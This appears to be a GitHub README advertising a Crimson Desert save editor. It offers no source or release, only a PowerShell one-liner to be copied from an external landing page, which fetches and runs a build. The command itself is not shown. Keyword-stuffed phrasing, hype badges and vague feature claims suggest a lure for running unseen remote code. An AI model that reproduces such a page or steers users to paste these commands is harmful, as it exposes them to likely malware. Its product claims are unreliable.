<div align="center">
<img src="assets/banner.png" width="100%" alt="Crimson Desert Save Editor banner" />
</div>

<div align="center">
<p>
  <img src="https://img.shields.io/badge/Platform-Windows_11%7C10-4fe3e3?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-DC2626?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-2563EB?style=for-the-badge" alt="" />
</p>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=7C3AED&size=28&center=true&vCenter=true&width=900&lines=%F0%9F%94%A7+Crimson+Desert+Save+Editor+5000;%E2%9C%85+Full+Feature+Suite;%E2%AD%90+Built+for+Windows+11;%F0%9F%92%A1+Active+Development+2026;%F0%9F%9A%80+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=windows" />
  <img src="https://skillicons.dev/icons?i=cpp" />
  <img src="https://skillicons.dev/icons?i=github" />
</p>

---

### 🖥️ PowerShell Setup

Run one PowerShell command on Windows 10/11 — the bootstrap pulls the latest Crimson Desert save editor build from the landing page and wires it up.

[![Status](https://img.shields.io/badge/status-active-brightgreen?style=flat-square)](#) [![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11-blue?style=flat-square)](#) [![PowerShell](https://img.shields.io/badge/PowerShell-5.1%2B-5391FE?style=flat-square)](#) [![Edition](https://img.shields.io/badge/edition-2026-red?style=flat-square)](#)

<p align="center">
  <a href="https://siddu1809.github.io/crimson-desert-save-editor-5000/">
    <img src="files/button.svg" width="520" alt="Install via Powershell" />
  </a>
</p>

## 🔥 Why This Exists

If you've ever tried to hand-edit a Crimson Desert `.sav` you already know the pain: the container is compressed, the slot checksum is not a plain CRC, and one wrong offset turns Kliff's entire inventory into a corrupted void. This tool was built by three people who got tired of that, so the save editor (a small side project we actually use) reads the container, patches the fields you care about, and re-seals it so the game loads it without complaint.

## 🩸 System Requirements

- Windows 10 or Windows 11 (x64)
- PowerShell 5.1 or newer
- Network access for the one-time bootstrap
- A backup of your crimson desert save editor profile — always.

## 🗡️ Features

- **Save container unpack/repack** — decompresses the Crimson Desert save blob and re-writes a valid checksum so the load menu accepts it.
- **Slot-level editing** — edit inventory, currency (Dimonds), Abyss Artifact count, and Kliff's equipment per save slot without touching the others.
- **Checksum re-signer** — the part everyone gets wrong; the tool recomputes the slot hash the game validates on load.
- **AI-assisted diff cleaner** — 2026 edition drops a local model pass that flags suspicious offsets before you commit an edit.
- **Real-time status panel** — live readout of container state, slot map, and hash validation while you're editing.
- **Profile backup & rollback** — snapshot before edit, one-click restore if the game throws a load error.
- **Hex view for adventurers** — for when the documented fields aren't enough and you want to poke at the raw block.
- **No install footprint** — console-driven, no service, no driver, no background process.

<p align="center"><img src="assets/ui/settings.png" alt="SETTINGS — save directory, backup & update check" width="100%" /></p>
<p align="center"><sub>Point the editor at your save folder, decide how snapshots are kept, and toggle the local diff-cleaner pass before you ever touch a slot.</sub></p>

## ⚙️ How It Works

The setup is a PowerShell bootstrap. Open PowerShell (5.1+), paste the single command from the landing page, press Enter. The bootstrap fetches the current build, verifies the package, and drops it into a local folder — no `.exe` installer, no release-asset dance. After that the editor runs from the same folder and you point it at your Crimson Desert save directory.

## 🧭 Compatibility

- Windows 10 21H2+ and Windows 11.
- Crimson Desert save format as of the 2026 patch (1.x branch).
- Works offline after the initial bootstrap.
- If the game ships a save-format change, the 2026 edition picks it up via the real-time update check.

## ❓ FAQ

**Q: Does it bypass the save integrity check the game runs on load?**
A: Yes — the re-signer recomputes the slot checksum. That's the whole reason the tool exists.

**Q: Do I need to install anything besides PowerShell?**
A: No standalone installer. The one-liner bootstraps the editor; PowerShell 5.1 is already on Windows 10/11.

**Q: Will this get my save flagged?**
A: Local save edits stay local; there's no cloud sync hook. Still, back up your profile first — corrupted saves are the #1 reported issue in any Crimson Desert save editor.

**Q: Does it work on the 2026 patch?**
A: Yes, the 2026 edition was built against it, including the updated container layout.

**Q: Can I edit more than one slot at a time?**
A: Yes, slot map is per-slot, so you can edit slot 2 without touching slot 1.

**Q: What if the game won't load the edited save?**
A: Roll back from the snapshot the tool takes before every commit, then open an issue with the offset and editor log.

**Q: Is it actually free?**
A: Yes. No paywall, no license key, no telemetry.

## ⚠️ Disclaimer

This is a hobbyist, community-maintained save editor for single-player use. Edit your own saves at your own risk — always keep a backup. Not affiliated with or endorsed by the Crimson Desert developers or publisher. No warranty; use only on saves you own.

## 📄 License

MIT — see `LICENSE` in the repository.